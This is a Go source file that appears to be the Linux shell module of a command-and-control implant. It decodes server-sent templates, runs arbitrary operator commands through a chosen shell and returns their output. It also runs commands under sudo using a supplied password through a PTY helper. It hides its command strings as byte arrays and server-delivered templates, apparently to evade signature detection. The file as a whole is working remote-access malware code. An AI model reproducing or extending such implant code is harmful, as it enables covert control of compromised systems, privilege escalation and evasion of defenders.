// server/docker/payloads/Linux/action_shell_linux.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// ShellTemplate matches the server's CommandTemplate structure
type ShellTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxShellPathBinBash    = 100
	idxShellPathBinZsh     = 101
	idxShellPathBinSh      = 102
	idxShellPathUsrBinBash = 103
	idxShellPathUsrBinZsh  = 104
	idxShellPathUsrBinSh   = 105
	idxShellFallback       = 106
	idxShellEnvVar         = 107
	idxShellArgC           = 108
	idxShellFlagSudo       = 109
	idxShellFlagTimeout    = 110
	idxShellStderrMarker   = 111
)

// Short flags (transformed by server, stored as byte arrays for minimal footprint)
var (
	flagSudo    = string([]byte{0x2d, 0x73})       // -s
	flagTimeout = string([]byte{0x2d, 0x74})       // -t
	fallbackSh  = string([]byte{0x73, 0x68})       // sh
	fallbackArg = string([]byte{0x2d, 0x63})       // -c
)

type ShellCommand struct {
	tpl *ShellTemplate
}

// getTpl safely retrieves a template string by index
func (c *ShellCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

// getUnixShell determines the appropriate shell to use on Unix-like systems
func (c *ShellCommand) getUnixShell() string {
	// Try to get the user's default shell from SHELL environment variable
	envVar := c.getTpl(idxShellEnvVar)
	if envVar != "" {
		if shell := os.Getenv(envVar); shell != "" {
			if _, err := os.Stat(shell); err == nil {
				return shell
			}
		}
	}

	// Fallback chain: try common shells in order of preference
	shellPaths := []int{
		idxShellPathBinBash,
		idxShellPathBinZsh,
		idxShellPathBinSh,
		idxShellPathUsrBinBash,
		idxShellPathUsrBinZsh,
		idxShellPathUsrBinSh,
	}

	for _, idx := range shellPaths {
		shell := c.getTpl(idx)
		if shell != "" {
			if _, err := os.Stat(shell); err == nil {
				return shell
			}
		}
	}

	// Last resort fallback
	if fb := c.getTpl(idxShellFallback); fb != "" {
		return fb
	}
	return fallbackSh
}

func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &ShellTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store PTY template for pty_helper.go to use (contains sudo/password strings)
	if c.tpl.Templates != nil {
		SetPtyTemplate(c.tpl.Templates)
	}

	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Default timeout
	timeout := 30 * time.Second
	commandArgs := args
	useSudo := false
	sudoPassword := ""

	// Get flag strings from template (or use minimal fallbacks)
	sudoFlag := c.getTpl(idxShellFlagSudo)
	if sudoFlag == "" {
		sudoFlag = flagSudo
	}
	timeoutFlag := c.getTpl(idxShellFlagTimeout)
	if timeoutFlag == "" {
		timeoutFlag = flagTimeout
	}

	// Parse flags
	i := 0
	for i < len(args) {
		switch args[i] {
		case sudoFlag:
			if i+1 >= len(args) {
				return CommandResult{
					Output:      Err(E20),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			useSudo = true
			sudoPassword = args[i+1]
			i += 2

		case timeoutFlag:
			if i+1 >= len(args) {
				return CommandResult{
					Output:      Err(E20),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			timeoutSeconds, err := strconv.Atoi(args[i+1])
			if err != nil || timeoutSeconds <= 0 {
				return CommandResult{
					Output:      ErrCtx(E22, args[i+1]),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			timeout = time.Duration(timeoutSeconds) * time.Second
			i += 2

		default:
			commandArgs = args[i:]
			i = len(args) // Break the loop
		}
	}

	if len(commandArgs) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Join command arguments
	commandStr := strings.Join(commandArgs, " ")

	// Get working directory
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	// Build output
	var output strings.Builder

	var commandOutput string
	var exitCode int
	var cmdErr error

	startTime := time.Now()

	if useSudo {
		// Use PTY helper for sudo
		ptyHelper := &PTYHelper{timeout: timeout}
		commandOutput, exitCode, cmdErr = ptyHelper.ExecuteWithSudo(sudoPassword, commandStr, workingDir)

	} else {
		// Regular shell execution
		shell := c.getUnixShell()

		// Get -c argument from template
		shellArg := c.getTpl(idxShellArgC)
		if shellArg == "" {
			shellArg = fallbackArg
		}

		execContext, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		cmd := exec.CommandContext(execContext, shell, shellArg, commandStr)
		cmd.Dir = workingDir

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		cmdErr = cmd.Run()

		commandOutput = stdout.String()
		if stderr.Len() > 0 {
			if commandOutput != "" {
				commandOutput += "\n"
			}
			// Get stderr marker from template
			stderrMarker := c.getTpl(idxShellStderrMarker)
			if stderrMarker != "" {
				commandOutput += stderrMarker + stderr.String()
			} else {
				commandOutput += stderr.String()
			}
		}

		if cmdErr != nil {
			if execContext.Err() == context.DeadlineExceeded {
				exitCode = 124
			} else if exitErr, ok := cmdErr.(*exec.ExitError); ok {
				exitCode = exitErr.ExitCode()
			} else {
				exitCode = 1
			}
		}
	}

	// Add command output
	output.WriteString(commandOutput)

	_ = startTime

	return CommandResult{
		Output:      output.String(),
		ExitCode:    exitCode,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
